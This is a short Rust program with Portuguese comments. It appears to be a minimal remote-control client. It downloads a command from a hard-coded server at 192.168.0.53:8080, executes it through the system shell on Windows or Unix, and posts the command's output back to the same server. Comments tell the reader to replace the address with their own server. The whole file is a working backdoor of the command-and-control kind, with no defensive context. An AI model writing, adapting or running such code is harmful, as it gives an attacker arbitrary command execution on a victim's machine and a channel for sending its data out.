#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let response = reqwest::get("http://192.168.0.53:8080/") // Substitua pelo URL do seu servidor
        .await?
        .text()
        .await?;

    let command = response.trim();
    println!("Comando recebido do servidor: {}", command);

    let output = if cfg!(target_os = "windows") {
        std::process::Command::new("cmd")
            .args(&["/C", command])
            .output()
            .expect("Falha ao executar o comando")
    } else {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .expect("Falha ao executar o comando")
    };

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    println!("Saída padrão:\n{}\n\nErro padrão:\n{}", stdout, stderr);

    let client = reqwest::Client::new();
    let response = client
        .post("http://192.168.0.53:8080/command") // Substitua pelo URL correto do seu servidor
        .body(stdout.to_string())
        .send()
        .await?;

    println!("Resposta do servidor: {}", response.status());

    Ok(())
}